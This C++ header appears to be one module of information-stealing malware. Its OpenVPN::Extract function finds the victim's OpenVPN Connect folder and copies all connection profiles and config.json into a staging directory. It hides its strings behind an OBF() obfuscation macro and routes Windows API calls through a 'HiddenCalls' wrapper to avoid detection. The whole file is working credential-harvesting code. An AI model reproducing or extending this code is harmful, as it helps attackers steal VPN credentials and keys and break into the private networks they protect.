#ifndef OPENVPN_HPP
#define OPENVPN_HPP

#include <string>
#include <filesystem>
#include "Winapi_structs.hpp"

namespace fs = std::filesystem;

namespace OpenVPN {
    inline void Extract(const std::string& baseDir) {
        std::string openvpnFolder = std::string(getenv(OBF("USERPROFILE"))) + "\\" + OBF("AppData\\Roaming\\OpenVPN Connect");
        if (!fs::exists(openvpnFolder)) {
            return;
        }

        std::string openvpnAccount = baseDir + "\\" + OBF("OpenVPN");
        HiddenCalls::CreateDirectoryA(openvpnAccount.c_str(), NULL);

        std::string profilesPath = openvpnFolder + "\\" + OBF("profiles");
        if (fs::exists(profilesPath)) {
            for (const auto& file : fs::recursive_directory_iterator(profilesPath)) {
                std::string fileDest = openvpnAccount + "\\" + file.path().filename().string();
                HiddenCalls::CopyFileA(file.path().string().c_str(), fileDest.c_str(), FALSE);
            }
        }

        std::string configPath = openvpnFolder + "\\" + OBF("config.json");
        if (fs::exists(configPath)) {
            HiddenCalls::CopyFileA(configPath.c_str(), (openvpnAccount + "\\" + OBF("config.json")).c_str(), FALSE);
        }
    }
}

#endif
